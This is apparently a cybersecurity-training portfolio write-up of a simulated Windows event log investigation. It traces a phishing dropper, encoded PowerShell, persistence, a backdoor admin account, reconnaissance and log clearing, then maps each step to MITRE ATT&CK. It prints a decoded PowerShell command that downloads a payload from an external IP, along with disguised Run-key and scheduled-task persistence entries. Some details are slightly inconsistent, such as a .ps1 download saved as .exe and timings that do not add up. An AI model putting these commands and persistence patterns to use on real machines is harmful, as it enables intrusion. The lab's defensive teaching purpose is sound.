# Day 12: BTL1-Style Lab — Windows Event Log Analysis

**Portfolio:** 30 Days of Cybersecurity | Blue Team Track  
**Date:** April 12, 2026  
**Tools:** Windows Event Log analysis, MITRE ATT&CK framework  
**Difficulty:** Intermediate  
**Format:** DFIR / Blue Team Labs One Style  

---

## Objective

Analyse a Windows Event Log extract from a compromised endpoint (WS-SARAH-01) to reconstruct the full attacker timeline, identify persistence mechanisms, map MITRE ATT&CK techniques, and document findings in a structured analyst report. This lab simulates the type of Windows forensics question found in the BTL1 certification exam.

---

## Scenario

Following the phishing compromise investigated on Day 11, the DFIR team acquired Windows Event Logs from WS-SARAH-01. The logs cover the period from initial execution at 09:47 AM through log clearing at 09:55 AM on April 11, 2026.

---

## Critical Event IDs Reference

| Event ID | Meaning | Forensic Significance |
|----------|---------|----------------------|
| 4624 | Successful logon | Baseline authentication activity |
| 4625 | Failed logon | Brute-force and credential guessing indicator |
| 4656 | Object access | File and folder read/write activity |
| 4657 | Registry value modified | Persistence and configuration changes |
| 4688 | Process created | Full execution chain visibility |
| 4698 | Scheduled task created | Persistence mechanism |
| 4720 | User account created | Backdoor account creation |
| 4732 | Account added to group | Privilege escalation |
| 4104 | PowerShell script execution | Malicious script logging |
| 104  | Event log cleared | Evidence destruction — critical alert |

---

## Event Log Analysis

### Execution Chain — Event ID 4688

```
09:47:31  invoice_setup.exe    (parent: chrome.exe)
09:47:33  powershell.exe -EncodedCommand  (parent: invoice_setup.exe)
09:47:55  svchost32.exe        (parent: powershell.exe)
09:51:10  whoami.exe           (parent: svchost32.exe)
09:51:12  ipconfig.exe         (parent: svchost32.exe)
09:51:15  net.exe /domain      (parent: svchost32.exe)
09:51:18  net.exe localgroup   (parent: svchost32.exe)
```

The parent-child process chain tells the full story. Chrome spawned the dropper, which spawned PowerShell, which spawned the persistent malware, which then ran reconnaissance commands. Each link in this chain is a forensic artefact.

### Decoded PowerShell Command — Event ID 4104

The encoded PowerShell command at 09:47:33 decoded to:

```powershell
Invoke-WebRequest -Uri http://91.240.118.172/payload.ps1 -OutFile C:\Users\sarah\AppData\Local\Temp\svchost32.exe
```

This command downloaded the malware payload directly from the attacker's C2 server and saved it to the Temp folder disguised as a legitimate Windows process name. The `-EncodedCommand` flag was used to hide this command from security tools scanning for suspicious plaintext strings.

### Persistence Mechanisms Identified

Two separate persistence mechanisms were established within 10 seconds of each other:

**Mechanism 1 — Registry Run Key (Event ID 4657 at 09:47:41)**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
Value: C:\Users\sarah\AppData\Local\Temp\svchost32.exe
```

**Mechanism 2 — Scheduled Task (Event ID 4698 at 09:47:39)**
```
Task name: WindowsUpdateHelper
Trigger: On logon
Action: C:\Users\sarah\AppData\Local\Temp\svchost32.exe
```

Using two redundant persistence mechanisms ensures the attacker maintains access even if one is discovered and removed.

### Credential Access Attempts — Event ID 4625

Five failed logon attempts from 91.240.118.172 between 09:48:10 and 09:48:14:

| Time | Account Attempted | Failure Reason |
|------|------------------|---------------|
| 09:48:10 | administrator | Unknown username |
| 09:48:11 | admin | Unknown username |
| 09:48:12 | sarah.kwame | Wrong password |
| 09:48:13 | sarah.kwame | Wrong password |
| 09:48:14 | sarah.kwame | Wrong password |

The progression from generic accounts to Sarah's specific username reveals the attacker pivoted to the known victim account after default credential attempts failed.

### Backdoor Account Creation — Event IDs 4720 and 4732

```
09:49:22  Account created: helpdesk_temp  (by: sarah.kwame)
09:49:25  helpdesk_temp added to: Administrators group  (by: sarah.kwame)
```

This is the most critical persistence finding. The attacker created a hidden admin account that survives even if Sarah's account is locked, her password is reset, or the malware is removed. The name `helpdesk_temp` is designed to appear as a legitimate IT support account during casual inspection.

### Post-Exploitation Reconnaissance — Event ID 4688

Four reconnaissance commands ran in sequence from svchost32.exe at 09:51:

| Command | Purpose | MITRE Technique |
|---------|---------|----------------|
| whoami.exe | Confirm current user identity | T1033 |
| ipconfig.exe | Map network configuration | T1016 |
| net user /domain | Enumerate domain users | T1087 |
| net localgroup administrators | Identify admin accounts | T1069 |

### File Access — Event ID 4656

```
09:51:44  C:\Users\sarah\Documents\*  READ  (svchost32.exe)
09:51:47  C:\Users\sarah\Desktop\*    READ  (svchost32.exe)
```

The attacker browsed Sarah's Documents and Desktop folders — the most common locations for sensitive files including contracts, credentials stored in text files, VPN configurations, and financial records. This indicates active staging for exfiltration.

### Log Clearing — Event ID 104

```
09:55:01  Security log cleared   (by: sarah.kwame)
09:55:02  System log cleared     (by: sarah.kwame)
09:55:03  Application log cleared (by: sarah.kwame)
```

All three Windows event logs were cleared in three consecutive seconds — deliberate evidence destruction. Every process creation, registry modification, account creation, and file access event would have been wiped without centralised SIEM log forwarding. Event ID 104 itself survived only because it was forwarded to external storage before the wipe completed.

---

## Full Attack Timeline Narrative

At 09:47:31 the attacker gained initial execution when Sarah ran `invoice_setup.exe`. Within two seconds, encoded PowerShell downloaded the actual malware from the C2 server and dropped it as `svchost32.exe`. Two persistence mechanisms were established immediately — a registry Run key and a scheduled task — both pointing to the malware binary.

With persistence secured, the malware called back to the C2 establishing a live reverse shell. The attacker then attempted remote authentication directly from the C2 IP, trying default accounts before pivoting to Sarah's known credentials. Unable to authenticate remotely, they used the existing shell to create a backdoor admin account named `helpdesk_temp` and added it to the local Administrators group.

Beginning at 09:51, the attacker conducted systematic reconnaissance — confirming the compromised identity, mapping the network, enumerating domain users and admin accounts. By 09:51:44 they were browsing file system locations for data staging. At 09:55, six minutes after gaining access, all three Windows event logs were cleared in an attempt to destroy all forensic evidence.

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Evidence |
|-------------|------|---------|
| T1059.001 | PowerShell | Encoded PowerShell payload delivery |
| T1105 | Ingress Tool Transfer | payload.ps1 downloaded via Invoke-WebRequest |
| T1547.001 | Registry Run Keys | HKCU Run key persistence |
| T1053.005 | Scheduled Task | WindowsUpdateHelper persistence task |
| T1136.001 | Local Account Creation | helpdesk_temp account created |
| T1098 | Account Manipulation | helpdesk_temp added to Administrators |
| T1033 | System Owner Discovery | whoami.exe execution |
| T1016 | Network Configuration Discovery | ipconfig.exe execution |
| T1087 | Account Discovery | net user /domain execution |
| T1069 | Permission Groups Discovery | net localgroup administrators |
| T1005 | Data from Local System | Documents and Desktop file access |
| T1070.001 | Clear Windows Event Logs | Security, System, Application logs cleared |

---

## Key Lessons

1. Event ID 4688 (process creation) with parent-child relationships reconstructs the full execution chain — always enable command line logging in Windows audit policy
2. Event ID 104 (log clearing) is the most critical alert in Windows environments — forward logs to a SIEM immediately so clearing the local log does not destroy evidence
3. Two persistence mechanisms in the same attack means removing one is not enough — always check for both scheduled tasks and registry Run keys during remediation
4. Backdoor account creation (4720 and 4732 together) must trigger an immediate alert — it is the attacker's insurance policy against detection
5. Reconnaissance commands (whoami, ipconfig, net) running from a non-standard parent process are definitive post-exploitation indicators

---

## Two Event IDs That Always Trigger Immediate Alerts

**Event ID 104** — Log clearing is never legitimate in a normal user context. It always indicates an attacker covering their tracks and is one of the highest-priority alerts in any Windows environment.

**Event ID 4732** — Adding any account to the Administrators group requires immediate investigation. Privilege escalation is a critical signal that an attacker has established or is establishing persistent elevated access.

---

## Skills Demonstrated

- Windows Event Log forensic analysis
- Parent-child process chain reconstruction
- PowerShell encoded command decoding
- Persistence mechanism identification (registry and scheduled tasks)
- Backdoor account detection
- Post-exploitation reconnaissance pattern recognition
- Evidence destruction detection and SIEM forwarding importance
- MITRE ATT&CK technique mapping (12 techniques)

---

## Files in This Repository

```
day-12-windows-event-log-analysis/
├── README.md     
└── report.pdf    
```

---

*Part of the 30 Days of Cybersecurity portfolio project.*
